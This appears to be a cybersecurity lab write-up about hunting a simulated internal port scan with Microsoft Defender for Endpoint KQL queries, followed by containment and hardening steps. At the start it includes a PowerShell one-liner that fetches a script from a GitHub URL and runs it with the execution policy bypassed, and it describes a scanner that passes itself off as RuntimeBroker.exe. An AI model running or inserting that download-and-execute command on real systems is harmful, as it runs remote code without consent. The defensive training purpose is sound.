# üõ°Ô∏è Threat Hunting Project: Entropy Gorilla Port Scan

## üìÅ Overview
This project documents the investigation, analysis, and response to an internal network scanning incident using Microsoft Defender for Endpoint (MDE), Azure, and PowerShell. The port scan was traced to a script executed on a Windows VM named `labuser`, using the SYSTEM account.

---

## üí£ Initial Setup: Simulated Attack
Before starting the hunt, a PowerShell-based port scanning script was intentionally executed on a VM to simulate malicious behavior and generate logs for threat hunting.

Script executed:
```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```

![Ran malicious code inside VM](https://github.com/user-attachments/assets/5b435f36-df4b-456d-8404-925af98891c6)

What the Malicious Script Does:

- The PowerShell script portscan.ps1 simulates an internal reconnaissance attack:

- Scans the IP range 10.0.0.4 to 10.0.0.10.

- Uses Test-NetConnection to ping each host and test for open TCP ports.

- Targets a list of common ports (e.g., 22, 80, 443, 3389).

- Logs results (open/closed) to C:\ProgramData\entropygorilla.log.

- Masquerades as a legitimate Windows process by naming itself RuntimeBroker.exe.
---

## üö© Scenario Summary
- A VM showed suspicious `ConnectionFailed` network activity.
- PowerShell script `portscan.ps1` was downloaded and executed.
- The scan targeted the internal subnet (10.0.0.0/16), using common ports.
- The script mimicked a system process (`RuntimeBroker.exe`).
- Activity mapped to multiple MITRE ATT&CK TTPs.

## üß™ Steps Performed

### 1. Preparation
- Hypothesis: An internal asset is scanning local network hosts.
- Reason: High failed connection volume and unrestricted PowerShell use.

### 2. Data Collection
Queried the following tables in MDE Advanced Hunting:
```kql
- `DeviceNetworkEvents`
| where DeviceName == "labuser"
| where ActionType == "ConnectionFailed"
| summarize count() by DeviceName, ActionType, LocalIP
| order by count_
```

### 3. Data Analysis
Confirmed host `10.0.0.95` showed excessive failed connections.
```kql
let IPInQuestion = "10.0.0.95";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP
| order by FailedConnectionsAttempts desc
```

### 4. Investigation
Used `DeviceProcessEvents` to locate scripts run during the attack:
```kql
let VMName = "labuser";
DeviceProcessEvents
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine, ActionType
```

Identified the script:
```
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```
**Logged in to the suspicious account and went to the ProgramData folder and found the portscan.ps1 and clicked to edit to see the whole script**

![Logged in to suspicious VM to check the file and the malicious script](https://github.com/user-attachments/assets/1f5a1ec5-39a8-45c8-975f-6580d39c2f56)

### 5. Response
Steps taken:
- ‚úÖ Isolated the VM (`labuser`) using Microsoft Defender.
- ‚úÖ Removed malicious file: `C:\programdata\portscan.ps1`
- ‚úÖ Rebuilt the VM from Azure Portal.
- ‚úÖ Enabled PowerShell Script Block & Module Logging.

### 6. Documentation
**Documented all processes for the threat hunting scenario in this pdf file:
**(file:///C:/Users/arbof/Downloads/FelipeCopy%20of%20Scenario%202_%20Sudden%20Network%20Slowdowns.pdf)**

### 7. Improvement
- üîê Hardened PowerShell logging.
- üìä Created detection rule for excessive `ConnectionFailed` logs.
- üßº Reviewed scheduled tasks and services on critical assets.

## üìå Recommendations
- Configure alerts for anomalous PowerShell execution.
- Lock down PowerShell usage via GPO or AppLocker.
- Monitor for file names mimicking system processes.
- Tune SIEM rules to detect local lateral movement patterns.

## üß∞ Tools Used
- Microsoft Defender for Endpoint (Advanced Hunting)
- Azure Portal (VM Deployment & Management)
- Windows PowerShell ISE
- PowerShell Logging Registry Policies
